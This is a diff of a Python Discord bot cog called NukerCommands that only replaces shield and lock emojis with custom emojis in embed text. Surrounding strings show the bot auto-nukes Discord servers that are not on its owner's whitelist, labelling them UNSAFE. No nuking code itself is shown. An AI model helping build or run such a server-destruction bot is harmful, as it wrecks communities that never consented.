@@ -37,7 +37,7 @@ class NukerCommands(commands.Cog):
         self.welcome_messages = [
             "🔥 Welcome to Digamber's Protected Server!",
             "💀 This server is SAFE from nukes!",
-            "🛡️ Whitelisted by Digamber",
+            "<:emoji_20:1430082362129125486> Whitelisted by Digamber",
             "<a:emoji_1:1430081383757512785> This server is under Digamber's protection"
         ]
 
@@ -189,7 +189,7 @@ class NukerCommands(commands.Cog):
             
             # Protection status
             embed.add_field(
-                name="🛡️ PROTECTION STATUS",
+                name="<:emoji_20:1430082362129125486> PROTECTION STATUS",
                 value="• **Auto-Nuke:** <a:emoji_1:1430081383757512785> ACTIVE\n• **DM System:** <a:emoji_1:1430081383757512785> ACTIVE\n• **Rate Limit:** <a:emoji_1:1430081383757512785> OPTIMIZED\n• **Status Updates:** <a:emoji_1:1430081383757512785> ACTIVE",
                 inline=False
             )
@@ -260,14 +260,14 @@ class NukerCommands(commands.Cog):
                 if welcome_channel:
                     # Professional welcome embed
                     welcome_embed = discord.Embed(
-                        title="🛡️ PROTECTED SERVER",
+                        title="<:emoji_20:1430082362129125486> PROTECTED SERVER",
                         description=f"Welcome {member.mention} to **{member.guild.name}**!",
                         color=0x00ff00,
                         timestamp=datetime.utcnow()
                     )
                     welcome_embed.add_field(
                         name="SERVER STATUS",
-                        value="<a:emoji_1:1430081383757512785> **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n🛡️ **PROTECTED** by Nuker System",
+                        value="<a:emoji_1:1430081383757512785> **WHITELISTED** by Digamber\n🔒 **SAFE** from auto-nukes\n<:emoji_20:1430082362129125486> **PROTECTED** by Nuker System",
                         inline=False
                     )
                     welcome_embed.add_field(
@@ -544,7 +544,7 @@ class NukerCommands(commands.Cog):
             perm_info += f"{idx}. {status} {name}\n"
         
         embed.add_field(
-            name="🔐 **PERMANENT SERVERS**",
+            name="<:emoji_20:1430082362129125486> **PERMANENT SERVERS**",
             value=perm_info or "No permanent servers",
             inline=False
         )
@@ -658,7 +658,7 @@ class NukerCommands(commands.Cog):
             return
         
         embed = discord.Embed(
-            title="🔒 **WHITELIST DATABASE**",
+            title="<:emoji_20:1430082362129125486> **WHITELIST DATABASE**",
             color=0x00ff00,
             timestamp=datetime.utcnow()
         )
@@ -666,7 +666,7 @@ class NukerCommands(commands.Cog):
         # Permanent whitelist
         if self.permanent_whitelist:
             embed.add_field(
-                name="🔐 **PERMANENT WHITELIST**",
+                name="<:emoji_20:1430082362129125486> **PERMANENT WHITELIST**",
                 value="*Cannot be removed*",
                 inline=False
             )
@@ -698,7 +698,7 @@ class NukerCommands(commands.Cog):
                 guild = self.bot.get_guild(server_id)
                 if guild:
                     embed.add_field(
-                        name=f"🛡️ {guild.name}",
+                        name=f"<:emoji_20:1430082362129125486> {guild.name}",
                         value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
                         inline=True
                     )
@@ -892,7 +892,7 @@ class NukerCommands(commands.Cog):
         # Server list (top 10)
         server_list = ""
         for i, guild in enumerate(list(self.bot.guilds)[:10], 1):
-            status = "🛡️" if self.is_whitelisted(guild.id) else "💀"
+            status = "<:emoji_20:1430082362129125486>" if self.is_whitelisted(guild.id) else "☠️"
             server_list += f"{i}. {status} {guild.name} (`{guild.member_count}`)\n"
         
         embed.add_field(
@@ -911,7 +911,7 @@ class NukerCommands(commands.Cog):
         if self.is_whitelisted(ctx.guild.id):
             # Professional protection embed
             embed = discord.Embed(
-                title="🛡️ DIGAMBER PROTECTION SYSTEM",
+                title="<:emoji_20:1430082362129125486> DIGAMBER PROTECTION SYSTEM",
                 color=0x00ff00,
                 timestamp=datetime.utcnow()
             )
@@ -998,7 +998,7 @@ class NukerCommands(commands.Cog):
             details = "• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Bot Safe: ❌ NO\n• Status: 💀 UNSAFE"
         
         embed.add_field(
-            name="🛡️ NUKE PROTECTION", 
+            name="<:emoji_20:1430082362129125486> NUKE PROTECTION", 
             value=f"{status}\n{details}",
             inline=False
         )
@@ -1089,7 +1089,7 @@ class NukerCommands(commands.Cog):
             )
             embed.add_field(
                 name="<a:emoji_27:1410746704537587752> WARNING",
-                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Protection: 🛡️ DISABLED",
+                value=f"• Server ID: `{server_id}`\n• Status: ❌ UNSAFE\n• Auto-Nuke: <a:emoji_1:1430081383757512785> ENABLED\n• Protection: <:emoji_20:1430082362129125486> DISABLED",
                 inline=False
             )
             embed.set_footer(text="Digamber Protection System • Protection Disabled")
@@ -1145,7 +1145,7 @@ class NukerCommands(commands.Cog):
                 guild = self.bot.get_guild(server_id)
                 if guild:
                     embed.add_field(
-                        name=f"🛡️ {guild.name}",
+                        name=f"<:emoji_20:1430082362129125486> {guild.name}",
                         value=f"**ID:** `{server_id}`\n**Members:** `{guild.member_count}`\n**Status:** 🔧 DYNAMIC",
                         inline=True
                     )
@@ -1175,7 +1175,7 @@ class NukerCommands(commands.Cog):
                 emoji = "🔒"
             elif guild.id in self.whitelisted_servers:
                 status = "<a:emoji_1:1430081383757512785> DYNAMIC WHITELIST | 🛡️ SAFE"
-                emoji = "🛡️"
+                emoji = "<:emoji_20:1430082362129125486>"
             else:
                 status = "❌ NOT WHITELISTED | 💀 UNSAFE"
                 emoji = "💀"
